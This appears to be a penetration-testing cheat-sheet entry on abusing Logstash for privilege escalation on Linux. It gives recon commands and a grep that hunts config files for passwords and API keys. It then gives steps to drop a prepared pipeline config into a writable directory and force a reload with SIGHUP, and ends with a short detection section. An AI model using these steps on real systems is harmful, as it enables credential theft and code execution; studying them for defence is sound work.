---
technique: Logstash Abuse
category: privilege-escalation
targets: Logstash
protocols: HTTP, Local
remote_capable: false
tags: linux privilege-escalation logstash elastic credentials pipeline
---

# Logstash Abuse

Logstash abuse targets writable pipeline configs, exposed monitoring APIs, and stored Elastic credentials used by the Logstash service.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Logstash present | Target must run Logstash locally or expose the API |
| Writable pipeline | Code execution requires write access to a loaded pipeline path |
| Reload trigger | Automatic reload, service restart, or SIGHUP must reload config |

## Linux

### Logstash processes

#sh #logstash #recon

List Logstash processes.

```sh title:"List Logstash processes"
pgrep -af logstash
```
<!-- cheat -->

### Service unit

#sh #systemd #logstash

Print the Logstash systemd unit.

```sh title:"Print Logstash service unit"
systemctl cat logstash
```
<!-- cheat -->

### Pipelines config

#sh #logstash #recon

Read the Logstash pipeline registry.

```sh title:"Read Logstash pipelines config"
cat /etc/logstash/pipelines.yml
```
<!-- cheat -->

### Logstash config

#sh #logstash #recon

Read the main Logstash configuration.

```sh title:"Read Logstash config"
cat /etc/logstash/logstash.yml
```
<!-- cheat -->

### Monitoring API

#sh #logstash #http

Query the local Logstash monitoring API.

```sh title:"Query Logstash monitoring API"
curl -s "http://127.0.0.1:9600/?pretty"
```
<!-- cheat -->

### Pipeline API

#sh #logstash #http

Query pipeline details from the monitoring API.

```sh title:"Query Logstash pipeline API"
curl -s "http://127.0.0.1:9600/_node/pipelines?pretty"
```
<!-- cheat -->

### Search pipeline secrets

#sh #logstash #credentials

Search Logstash configs for credential fields.

```sh title:"Search Logstash configs for secrets"
grep -R -i -e password -e cloud_auth -e api_key -e user /etc/logstash /usr/share/logstash 2>/dev/null
```
<!-- cheat -->

### Step 1: Install pipeline config

#sh #logstash #file-write

Copy a prepared pipeline config into a writable pipeline directory.

```sh title:"Install Logstash pipeline config"
cp "$pipeline_file" "$pipeline_dir/$pipeline_name.conf"
```
<!-- cheat
var pipeline_file
var pipeline_dir
var pipeline_name
-->

### Step 2: Reload Logstash

#sh #logstash

Send SIGHUP to a Logstash process to request config reload.

```sh title:"Reload Logstash process"
kill -SIGHUP "$pid"
```
<!-- cheat
var pid
-->

## Detection

Monitor pipeline file writes, Logstash reloads, monitoring API access, and exec input plugins in pipeline configs.
